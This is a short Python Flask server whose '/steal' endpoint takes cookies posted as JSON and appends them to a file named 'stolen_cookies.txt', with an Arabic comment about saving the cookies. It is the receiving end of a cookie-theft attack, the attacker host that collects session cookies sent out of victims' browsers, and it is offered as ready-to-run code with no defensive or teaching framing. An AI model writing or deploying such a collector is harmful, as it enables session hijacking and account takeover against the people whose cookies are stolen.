from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    cookies = data['cookies']
    
    # حفظ الكوكيز في ملف
    with open('stolen_cookies.txt', 'a') as f:
        f.write(cookies + '\n')
    
    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)